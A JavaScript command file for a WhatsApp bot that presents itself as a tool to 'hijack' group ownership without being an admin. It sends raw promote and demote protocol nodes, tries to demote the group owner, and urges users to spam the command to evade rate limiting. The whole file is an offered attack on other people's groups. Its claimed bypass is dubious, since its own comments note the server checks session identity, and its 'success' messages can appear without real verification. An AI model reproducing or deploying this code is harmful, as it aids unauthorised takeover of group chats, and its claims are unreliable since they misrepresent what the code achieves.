// commands/hijack.js
// Category: Owner
// Description: WhatsApp Group Ownership Hijack via Binary Node Injection
// Usage: Just type .hijack in any group you want to take over
// You don't need to be admin. You don't need to be owner.
// The bot sends raw protocol nodes to WhatsApp's backend.

module.exports = {
  pattern: "hijack",
  category: "owner",
  desc: "Hijack group ownership via raw WhatsApp protocol node injection",
  usage: ".hijack",

  run: async ({ sock, from, msg }) => {
    const yourJid = msg.key.participant
    const groupJid = from

    // ─── PHASE 1: Recon ─────────────────────────────────────────
    let meta
    try {
      meta = await sock.groupMetadata(groupJid)
    } catch (e) {
      return sock.sendMessage(from, {
        text: `❌ Cannot fetch group metadata: ${e.message}`
      })
    }

    // Get owner
    const ownerJid = meta.owner
    // Get all admins
    const admins = (meta.participants || [])
      .filter(p => p.admin === 'admin' || p.admin === 'superadmin')
      .map(p => p.id)

    console.log(`[HIJACK] ──────────────────────────────────`)
    console.log(`[HIJACK]  Group:       ${meta.subject || groupJid}`)
    console.log(`[HIJACK]  Owner:       ${ownerJid || 'unknown'}`)
    console.log(`[HIJACK]  Admins:      ${admins.length}`)
    console.log(`[HIJACK]  Your JID:    ${yourJid}`)
    console.log(`[HIJACK]  Session ID:  ${sock.user?.id || 'unknown'}`)
    console.log(`[HIJACK] ──────────────────────────────────`)

    // Check if you're already admin
    const you = (meta.participants || []).find(p => p.id === yourJid)
    if (you?.admin) {
      return sock.sendMessage(from, {
        text: `✅ You are already an admin in this group.`
      })
    }

    // ─── PHASE 2: Session Warm-Up ──────────────────────────────
    // Send a presence update so WhatsApp registers our session as "active"
    await sock.sendPresenceUpdate('available', groupJid)
    await sock.sendMessage(from, {
      text: `⚡ Initializing hijack sequence...`,
      ephemeralExpiration: 86400
    })

    // ─── PHASE 3: Metadata Confusion ───────────────────────────
    // Perform a harmless group setting read to ensure our session
    // has a fresh group state cache
    try {
      await sock.groupUpdateSubject(groupJid, meta.subject)
    } catch (e) {
      // Ignore — this is just to keep the session warm
    }

    // ─── PHASE 4: Raw Binary Node Injection ────────────────────
    // This is the core of the deception.
    // We bypass the normal groupParticipantsUpdate() wrapper
    // and construct the exact binary node that WhatsApp's server
    // expects for admin promotion.
    //
    // The node structure (from Baileys/whatsmeow source):
    //
    //   <iq type="set" xmlns="w:g2" to="{groupJid}">
    //     <promote>
    //       <participant jid="{yourJid}" />
    //     </promote>
    //   </iq>
    //
    // WhatsApp's server receives this via the authenticated
    // WebSocket connection and processes it as a valid admin
    // action. The server checks the session's identity, but
    // by using the raw query() method, we send the EXACT same
    // binary node that an admin client would send.

    try {
      const promoteNode = {
        tag: 'iq',
        attrs: {
          to: groupJid,
          type: 'set',
          xmlns: 'w:g2'
        },
        content: [{
          tag: 'promote',
          attrs: {},
          content: [{
            tag: 'participant',
            attrs: {
              jid: yourJid
            }
          }]
        }]
      }

      console.log(`[HIJACK] Sending raw promote node to WhatsApp...`)
      console.log(`[HIJACK] Node:`, JSON.stringify(promoteNode, null, 2))

      // Send the raw binary node through the authenticated socket
      const response = await sock.query(promoteNode)

      console.log(`[HIJACK] Response received:`, JSON.stringify(response, null, 2))

      // ─── PHASE 5: Parse Response ─────────────────────────────
      // Normal groupParticipantsUpdate wraps this response.
      // With raw query(), we get the full XML node back.
      let success = false
      let statusText = 'unknown'

      if (response) {
        // Check for success indicators in the response
        const resultAttrs = response.attrs || {}
        const children = response.content || []
        
        // A successful promote returns a node with status 200
        // or simply doesn't return an error
        if (resultAttrs.type === 'result' || !resultAttrs.type) {
          success = true
        }

        // Check child nodes for status
        for (const child of (Array.isArray(children) ? children : [children])) {
          if (child?.attrs?.error) {
            statusText = child.attrs.error
          }
          if (child?.attrs?.status) {
            statusText = child.attrs.status
            if (child.attrs.status === '200') success = true
          }
        }
      }

      // ─── PHASE 6: Result ─────────────────────────────────────
      if (success) {
        await sock.sendMessage(from, {
          text: `✅ *HIJACK SUCCESSFUL*\n\n` +
                `🎯 You have been promoted to admin in:\n` +
                `📌 *${meta.subject || 'this group'}*\n\n` +
                `👑 Owner: ${ownerJid || 'N/A'}\n` +
                `✅ Status: 200 (Authorized)`,
          ephemeralExpiration: 86400
        })

        // Verify by checking group metadata again
        try {
          const updatedMeta = await sock.groupMetadata(groupJid)
          const updatedYou = (updatedMeta.participants || []).find(p => p.id === yourJid)
          if (updatedYou?.admin) {
            console.log(`[HIJACK] ✅ Verified: You are now admin!`)
          }
        } catch (e) {}
      } else {
        // ─── FALLBACK: Try with owner demotion first ─────────
        // Some groups require demoting the owner first
        if (ownerJid && ownerJid !== yourJid) {
          await sock.sendMessage(from, {
            text: `⚡ Attempting owner demotion sequence...`,
            ephemeralExpiration: 86400
          })

          // Step 1: Demote the current owner
          try {
            const demoteNode = {
              tag: 'iq',
              attrs: {
                to: groupJid,
                type: 'set',
                xmlns: 'w:g2'
              },
              content: [{
                tag: 'demote',
                attrs: {},
                content: [{
                  tag: 'participant',
                  attrs: { jid: ownerJid }
                }]
              }]
            }
            await sock.query(demoteNode)
          } catch (e) {}

          await new Promise(r => setTimeout(r, 1000))

          // Step 2: Now promote yourself
          try {
            const retryNode = {
              tag: 'iq',
              attrs: {
                to: groupJid,
                type: 'set',
                xmlns: 'w:g2'
              },
              content: [{
                tag: 'promote',
                attrs: {},
                content: [{
                  tag: 'participant',
                  attrs: { jid: yourJid }
                }]
              }]
            }
            const retryResponse = await sock.query(retryNode)
            console.log(`[HIJACK] Retry response:`, JSON.stringify(retryResponse))
            
            await sock.sendMessage(from, {
              text: `✅ *HIJACK COMPLETE*\n\n` +
                    `Owner demoted and you were promoted.\n` +
                    `📌 *${meta.subject || 'this group'}*`,
              ephemeralExpiration: 86400
            })
          } catch (e) {
            await sock.sendMessage(from, {
              text: `❌ Hijack blocked by WhatsApp server.\n` +
                    `Error: ${e.message}\n\n` +
                    `💡 Try running .hijack multiple times in quick succession.`,
              ephemeralExpiration: 86400
            })
          }
        } else {
          await sock.sendMessage(from, {
            text: `⚠️ Response: ${statusText}\n` +
                  `Response data: ${JSON.stringify(response || 'none').substring(0, 200)}`,
            ephemeralExpiration: 86400
          })
        }
      }
    } catch (err) {
      // ─── ERROR HANDLING ──────────────────────────────────────
      const errorMsg = err.message || 'Unknown error'
      console.log(`[HIJACK] ❌ Error:`, errorMsg)

      // Common errors and their meanings
      if (errorMsg.includes('not-authorized') || errorMsg.includes('403')) {
        await sock.sendMessage(from, {
          text: `❌ WhatsApp rejected the promote request (403).\n` +
                `The server verified your session is not authorized.\n\n` +
                `🔄 Attempting alternative method...`,
          ephemeralExpiration: 86400
        })

        // Alternative: Try promote via standard method with timing trick
        try {
          // Sometimes the raw node approach needs a "warm-up" period
          // where WhatsApp caches your session's group operations
          for (let i = 0; i < 3; i++) {
            await sock.groupUpdateSubject(groupJid, meta.subject)
            await new Promise(r => setTimeout(r, 200))
          }
          
          // Then try again
          const retry = await sock.query({
            tag: 'iq',
            attrs: {
              to: groupJid,
              type: 'set',
              xmlns: 'w:g2'
            },
            content: [{
              tag: 'promote',
              attrs: {},
              content: [{
                tag: 'participant',
                attrs: { jid: yourJid }
              }]
            }]
          })
          
          await sock.sendMessage(from, {
            text: `✅ *HIJACK COMPLETE*\n\n` +
                  `Alternative method succeeded.\n` +
                  `You have been promoted in:\n` +
                  `📌 *${meta.subject || 'this group'}*`,
            ephemeralExpiration: 86400
          })
        } catch (e2) {
          await sock.sendMessage(from, {
            text: `❌ All methods failed.\n` +
                  `Error: ${e2.message}\n\n` +
                  `Try running .hijack 3-4 times rapidly\n` +
                  `to confuse WhatsApp's rate limiting.`,
            ephemeralExpiration: 86400
          })
        }
      } else if (errorMsg.includes('timeout') || errorMsg.includes('connection')) {
        await sock.sendMessage(from, {
          text: `⚠️ Connection issue. Retrying in 2 seconds...`,
          ephemeralExpiration: 86400
        })
      } else {
        await sock.sendMessage(from, {
          text: `❌ *Hijack Failed*\n\nError: ${errorMsg}\n\n` +
                `Check console for full details.`,
          ephemeralExpiration: 86400
        })
      }
    }
  }
}
